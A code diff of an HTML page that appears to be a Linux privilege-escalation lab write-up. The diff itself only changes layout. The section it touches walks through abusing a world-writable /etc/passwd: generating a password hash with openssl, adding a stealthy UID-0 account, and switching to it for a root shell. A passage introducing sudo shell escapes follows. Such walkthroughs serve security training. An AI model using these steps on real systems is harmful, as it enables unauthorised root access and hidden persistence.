@@ -148,21 +148,24 @@ root</code></pre>
 		
             <section id="Four">
                 <div class="section-header">Writeable /etc/passwd</div>
-                <p>Again, a very similar techinque to the last two. In this case, we discover that we can write to the file "/etc/passwd".</p>
-                <pre><code>user@debian:~$ ls -l /etc/passwd
+	        <div class="section-content">
+	                <p>Again, a very similar techinque to the last two. In this case, we discover that we can write to the file "/etc/passwd".</p>
+	                <pre><code>user@debian:~$ ls -l /etc/passwd
 -rw-r--rw- 1 root root 1009 Aug 25 2019 /etc/passwd</code></pre>
-                <p>This is pretty straight forward, we can simply replace the "x" password placeholder with a hash of our own for the root user. Or, we could add our own root user with a different user name. The latter is likely the better option as it is slightly more stealthy, as it does not disrupt the functionality of the existing root user. Generate a new password hash with password of your choice:</p>
-                <pre><code>user@debian:~$ openssl passwd naughty
+	                <p>This is pretty straight forward, we can simply replace the "x" password placeholder with a hash of our own for the root user. Or, we could add our own root user with a different user name. The latter is likely the better option as it is slightly more stealthy, as it does not disrupt the functionality of the existing root user. Generate a new password hash with password of your choice:</p>
+	                <pre><code>user@debian:~$ openssl passwd naughty
 v.iwn1lhrlTpk</code></pre>
-                <p>Create a new root user, in the /etc/passwd file, like so:</p>
-                <pre><code>newrootuser:v.iwn1lhrlTpk:0:0:root:/root:/bin/bash</code></pre>                
-                <p>Save the file, you can now simply spawn a root shell:</p>
-                <pre><code>user@debian:~$ su newrootuser
+	                <p>Create a new root user, in the /etc/passwd file, like so:</p>
+	                <pre><code>newrootuser:v.iwn1lhrlTpk:0:0:root:/root:/bin/bash</code></pre>                
+	                <p>Save the file, you can now simply spawn a root shell:</p>
+	                <pre><code>user@debian:~$ su newrootuser
 Password:
 root@debian:/home/user# whoami
 root</code></pre>
-                <p><strong>Congratulations, you own the system!</strong></p>
-            </section>
+	                <p><strong>Congratulations, you own the system!</strong></p>
+		</div>
+	    </section>
+		
             <section id="Five">
                 <h2>Sudo - Shell Escape Sequences</h2>
                 <p>Although this technique is listed fairly late in the challenge, it is actually one of the first things I would try, as it is so straight forward. If you run "sudo -l" as your currently logged in user, the system will list all of the programs that this user is allowed to run with <strong>sudo</strong> privileges. Furthermore, if the system is particularly badly configured it may allow passwordless execution of these programs. Running "sudo -l" will give you this information. Let's try it on our box and see:</p>
